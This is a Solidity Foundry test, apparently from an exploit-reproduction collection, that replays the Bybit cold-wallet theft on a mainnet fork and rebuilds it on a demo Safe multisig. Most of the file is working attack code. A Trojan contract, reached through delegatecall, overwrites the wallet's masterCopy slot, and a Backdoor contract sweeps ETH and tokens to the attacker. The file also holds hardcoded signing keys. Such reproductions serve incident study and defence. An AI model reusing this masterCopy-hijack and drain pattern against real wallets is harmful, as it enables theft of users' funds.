// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import {IERC20} from "../interface.sol";

// @KeyInfo - Total Lost : 1.5B (401346 ETH + 8000 mETH + 15000 cmETH + 90375 stETH)
// Attacker : https://etherscan.io/address/0x0fa09c3a328792253f8dee7116848723b72a6d2e
// Attack Contract (Trojan): https://etherscan.io/address/0x96221423681a6d52e184d440a8efcebb105c7242
// Attack Contract (Backdoor): https://etherscan.io/address/0xbdd077f651ebe7f7b3ce16fe5f2b025be2969516
// Vulnerable Contract (Bybit Cold Wallet): https://etherscan.io/address/0x1db92e2eebc8e0c075a02bea49a2935bcd2dfcf4
// Attack Tx (Change masterCopy): https://etherscan.io/tx/0x46deef0f52e3a983b67abf4714448a41dd7ffd6d32d32da69d62081c68ad7882
// Attack Tx (ETH): https://etherscan.io/tx/0xb61413c495fdad6114a7aa863a00b2e3c28945979a10885b12b30316ea9f072c
// Attack Tx (mETH): https://etherscan.io/tx/0xbcf316f5835362b7f1586215173cc8b294f5499c60c029a3de6318bf25ca7b20
// Attack Tx (cmETH): https://etherscan.io/tx/0x847b8403e8a4816a4de1e63db321705cdb6f998fb01ab58f653b863fda988647
// Attack Tx (stETH): https://etherscan.io/tx/0xa284a1bc4c7e0379c924c73fcea1067068635507254b03ebbbd3f4e222c1fae0

// @Info
// Vulnerable Contract Code (Proxy): https://etherscan.io/address/0x1db92e2eebc8e0c075a02bea49a2935bcd2dfcf4#code
// Vulnerable Contract Code (Implementation): https://etherscan.io/address/0x34cfac646f301356faa8b21e94227e3583fe3f5f#code

// @Analysis
// Post-mortem : https://x.com/zachxbt/status/1893211577836302365
// Twitter Guy : https://x.com/SlowMist_Team/status/1892963250385592345
// Hacking God : https://x.com/PatrickAlphaC/status/1893215304135618759

contract Enum {
    enum Operation {
        Call,
        DelegateCall
    }
}

interface IMultisigWallet {
    function getTransactionHash(
        address to,
        uint256 value,
        bytes memory data,
        Enum.Operation operation,
        uint256 safeTxGas,
        uint256 baseGas,
        uint256 gasPrice,
        address gasToken,
        address refundReceiver,
        uint256 _nonce
    ) external view returns (bytes32);

    function execTransaction(
        address to,
        uint256 value,
        bytes calldata data,
        Enum.Operation operation,
        uint256 safeTxGas,
        uint256 baseGas,
        uint256 gasPrice,
        address gasToken,
        address payable refundReceiver,
        bytes calldata signatures
    ) external;

    function nonce() external view returns (uint256);
}

interface IBackdoorContract {
    function sweepETH(address destination) external;
    function sweepERC20(address token, address destination) external;
}

interface IProxyFactory {
    function createProxyWithNonce(
        address masterCopy,
        bytes memory initializer,
        uint256 saltNonce
    ) external returns (address proxy);
}

contract Bybit is BaseTestWithBalanceLog {
    // Poc
    address public safeProxyFactory1_1_1 = 0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B;
    address public safeMasterCopy1_1_1 = 0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F;
    address public safeDefaultFallbackHandler1_1_1 = 0xd5D82B6aDDc9027B22dCA772Aa68D5d74cdBdF44;

    address public multisigOwner1 = 0x6cd5327027190eF45476D80B5D3BdE2E80f6aCbC;
    address public multisigOwner2 = 0xe6A99c3869D6D0691CCe23E83b571A471Bac661D;
    address public multisigOwner3 = 0x72F42564BE83B755720dBadC875cc919046A1856;

    uint256 privateKey1 = 0x481823978ae08ec5f1793cd753c16f7887b56ae123dca7a4e799ffa6cd432a1e;
    uint256 privateKey2 = 0x43cd2551585bcf96b2bc6ba97afcc2e0f3405b78c420a03b3d7a0f7fab5de249;
    uint256 privateKey3 = 0x62ef4b669bbf0d728b538d790d995aeae4fda9503fdc275bda21bd07b9614fb6;

    Trojan trojan;
    Backdoor backdoor;
    address public multisigWallet;

    // Real Exploit
    address public bybitColdWallet1 = 0x1Db92e2EeBC8E0c075a02BeA49a2935BcD2dFCF4;
    address public attacker = 0x0fa09C3A328792253f8dee7116848723b72a6d2e;
    address public trojanContract = 0x96221423681A6d52E184D440a8eFCEbB105C7242;
    address public backdoorContract = 0xbDd077f651EBe7f7b3cE16fe5F2b025BE2969516;

    address public mETH = 0xd5F7838F5C461fefF7FE49ea5ebaF7728bB0ADfa; // Mantle Staked Ether
    address public cmETH = 0xE6829d9a7eE3040e1276Fa75293Bde931859e8fA; // Mantle Restaked Ether
    address public stETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84; // Lido Staked ETH

    bytes public signature =
        hex"d0afef78a52fd504479dc2af3dc401334762cbd05609c7ac18db9ec5abf4a07a5cc09fc86efd3489707b89b0c729faed616459189cb50084f208d03b201b001f1f0f62ad358d6b319d3c1221d44456080068fe02ae5b1a39b4afb1e6721ca7f9903ac523a801533f265231cd35fc2dfddc3bd9a9563b51315cf9d5ff23dc6d2c221fdf9e4b878877a8dbeee951a4a31ddbf1d3b71e127d5eda44b4730030114baba52e06dd23da37cd2a07a6e84f9950db867374a0f77558f42adf4409bfd569673c1f";

    uint256 blocknumToForkFrom = 21_895_238 - 1;

    function setUp() public {
        vm.createSelectFork("mainnet", blocknumToForkFrom);

        // Poc
        vm.label(address(safeProxyFactory1_1_1), "Safe proxy factory");
        vm.label(address(safeMasterCopy1_1_1), "Safe master copy");
        vm.label(address(safeDefaultFallbackHandler1_1_1), "Safe default fallback handler");
        vm.label(address(multisigOwner1), "Multisig owner 1");
        vm.label(address(multisigOwner2), "Multisig owner 2");
        vm.label(address(multisigOwner3), "Multisig owner 3");
        // Real Exploit
        vm.label(address(bybitColdWallet1), "Bybit cold wallet 1");
        vm.label(address(trojanContract), "Trojan contract");
        vm.label(address(backdoorContract), "Backdoor contract");
        vm.label(address(attacker), "Attacker");
        vm.label(address(mETH), "Mantle Staked Ether");
        vm.label(address(cmETH), "Mantle Restaked Ether");
        vm.label(address(stETH), "Lido Staked ETH");
    }

    function testExploit() public {
        console.log("Real exploit start......");
        // Print slot 0 of bybit cold wallet 1
        // slot 0 stores masterCopy(address)
        console.log(
            "Before attack, Bybit cold wallet 1 masterCopy:",
            address(uint160(uint256(vm.load(bybitColdWallet1, bytes32(uint256(0))))))
        );
        // 0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F

        // Change bybit cold wallet 1 masterCopy to backdoorContract
        changeMasterCopy(bybitColdWallet1, address(trojanContract), address(backdoorContract), signature);

        // Bybit cold wallet's masterCopy is changed to backdoorContract
        console.log(
            "After attack, Bybit cold wallet 1 masterCopy:",
            address(uint160(uint256(vm.load(bybitColdWallet1, bytes32(uint256(0))))))
        );

        stealMoney();
    }

    function testFakeExploit() public {
        console.log("Fake exploit start......");
        trojan = new Trojan();
        backdoor = new Backdoor();

        multisigWallet = createMultisigWallet(); // I use 3 owners for example (threshold = 2)
        // Get transaction hash of changing masterCopy
        bytes32 transactionHash = getTransactionHash(
            address(trojan),
            abi.encodeWithSelector(Trojan.transfer.selector, address(backdoor), 0),
            Enum.Operation.DelegateCall
        );

        // Sign the transaction hash
        bytes memory fakeSignature = signTransaction(transactionHash);

        console.log(
            "Before attack, multisigWallet masterCopy:",
            address(uint160(uint256(vm.load(multisigWallet, bytes32(uint256(0))))))
        );

        // Change masterCopy to attacker's contract(backdoor)
        changeMasterCopy(multisigWallet, address(trojan), address(backdoor), fakeSignature);

        console.log(
            "After attack, multisigWallet masterCopy:",
            address(uint160(uint256(vm.load(multisigWallet, bytes32(uint256(0))))))
        );

        // I only demonstrate the attack on ETH
        vm.deal(multisigWallet, 400_000 ether);
        vm.deal(address(this), 0 ether);
        IBackdoorContract(multisigWallet).sweepETH(address(this));
        console.log("After attack, multisigWallet balance left:", address(multisigWallet).balance / 1 ether, "ETH");
        console.log("Attacker earned balance:", address(this).balance / 1 ether, "ETH");
    }

    function changeMasterCopy(address multisigWallet, address trojan, address backdoor, bytes memory signature) public {
        IMultisigWallet(multisigWallet).execTransaction(
            trojan,
            0,
            abi.encodeWithSignature("transfer(address,uint256)", backdoor, 0),
            Enum.Operation.DelegateCall,
            45_746,
            0,
            0,
            address(0),
            payable(address(0)),
            signature
        );
    }

    function stealMoney() public {
        // Only hacker can call these functions
        vm.startPrank(attacker);
        // Sweep ETH
        sweepETH(attacker);
        console.log("Attacker ETH Balance After exploit:", address(attacker).balance / 1 ether, "ETH");

        // Sweep ERC20
        sweepERC20(mETH, attacker);
        console.log("Attacker mETH Balance After exploit:", IERC20(mETH).balanceOf(attacker) / 1 ether, "ETH");
        sweepERC20(cmETH, attacker);
        console.log("Attacker cmETH Balance After exploit:", IERC20(cmETH).balanceOf(attacker) / 1 ether, "ETH");
        sweepERC20(stETH, attacker);
        console.log("Attacker stETH Balance After exploit:", IERC20(stETH).balanceOf(attacker) / 1 ether, "ETH");
        vm.stopPrank();
    }

    function sweepETH(address destination) public {
        IBackdoorContract(bybitColdWallet1).sweepETH(destination);
    }

    function sweepERC20(address token, address destination) public {
        IBackdoorContract(bybitColdWallet1).sweepERC20(token, destination);
    }

    function createMultisigWallet() public returns (address) {
        address[] memory owners = new address[](3);
        owners[0] = multisigOwner1;
        owners[1] = multisigOwner2;
        owners[2] = multisigOwner3;

        uint256 threshold = 2;

        bytes memory initializer = abi.encodeWithSignature(
            "setup(address[],uint256,address,bytes,address,address,uint256,address)",
            owners, // List of Safe owners
            threshold, // Confirmation threshold
            address(0), // 'to' address: no additional delegate call after setup
            "", // Empty data payload (no extra call data)
            safeDefaultFallbackHandler1_1_1, // Fallback handler for the Safe
            address(0), // Payment token (address(0) indicates ETH)
            0, // Payment amount (0 if not used)
            address(0) // Payment receiver (not used in this case)
        );
        // Create a multisig wallet
        multisigWallet = IProxyFactory(safeProxyFactory1_1_1).createProxyWithNonce(
            safeMasterCopy1_1_1,
            initializer,
            block.timestamp
        );

        return multisigWallet;
    }

    function getTransactionHash(address to, bytes memory data, Enum.Operation operation) public returns (bytes32) {
        bytes32 transactionHash = IMultisigWallet(multisigWallet).getTransactionHash(
            to,
            0,
            data,
            operation,
            45_746,
            0,
            0,
            address(0),
            payable(address(0)),
            IMultisigWallet(multisigWallet).nonce()
        );
        return transactionHash;
    }

    function signTransaction(bytes32 transactionHash) public returns (bytes memory) {
        (uint8 v1, bytes32 r1, bytes32 s1) = vm.sign(privateKey1, transactionHash);
        (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(privateKey2, transactionHash);

        bytes memory sig1 = abi.encodePacked(r1, s1, v1);
        bytes memory sig2 = abi.encodePacked(r2, s2, v2);
        return abi.encodePacked(sig1, sig2);
    }

    fallback() external payable {}
}

contract Trojan {
    address public masterCopy;

    constructor() {}

    function transfer(address to, uint256 amount) public {
        masterCopy = to; // Store the address of the backdoor contract in slot 0
    }
}

contract Backdoor {
    constructor() {}

    function sweepETH(address destination) public {
        (bool success, ) = destination.call{value: address(this).balance}("");
        require(success, "Failed to sweep ETH");
    }

    function sweepERC20(address token, address destination) public {
        IERC20(token).transfer(destination, IERC20(token).balanceOf(address(this)));
    }
}
